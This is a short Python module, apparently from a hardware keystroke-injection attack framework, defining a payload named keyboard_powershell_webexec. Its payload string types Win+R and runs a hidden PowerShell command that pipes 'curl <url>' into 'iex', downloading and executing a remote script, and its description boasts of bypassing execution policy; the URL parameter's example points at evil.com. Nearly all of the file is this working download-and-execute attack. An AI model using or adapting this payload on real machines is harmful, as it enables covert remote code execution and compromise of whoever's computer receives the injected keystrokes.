__author__ = "Pawel Maziarz"
__copyright__ = "Copyright 2017, Immunity Systems Sp. z o.o."
__credits__ = ["Andrzej Nowodworski", "Karol Celinski"]
__license__ = "GPL"
__version__ = "1.0.0"
__maintainer__ = "Pawel Maziarz"
__email__ = "pawelm@immunity-systems.com"

from core.payload import Payload
from core.validators import *

class keyboard_powershell_webexec(Payload):
    """
    Name of payload.
    """
    name = "keyboard_powershell_webexec"
    """
    Description.
    """
    info = """Download powershell script via Web and execute it.
Security policy is bypassing with Invoke-Expression functionality.
    """
    """
    Short description
    """
    short_description = "Download powershell script via Web and execute it"
    """
    Abilities that is required by payload.
    """
    satisfied_actions = ['keyboard_write', 'sleep']
    
    parameters = {
                'url': {
                        'description':"URL of powershell script (for example http://evil.com/foo.ps1)",
                        'default':"",
                        'required':"True",
                        'value':""
                },
        }

    def get_payload(self):
       return """keyboard_write(LeftGUI+"R","powershell -w hidden -c curl %s|iex",ENTER,"EXIT", ENTER)"""%(self.parameters['url']['value'])

    def validate(self):
        if not self.parameters['url']['value']:
            return "You have to specify url parameter"
        return ""

def init():
    return keyboard_powershell_webexec()
 
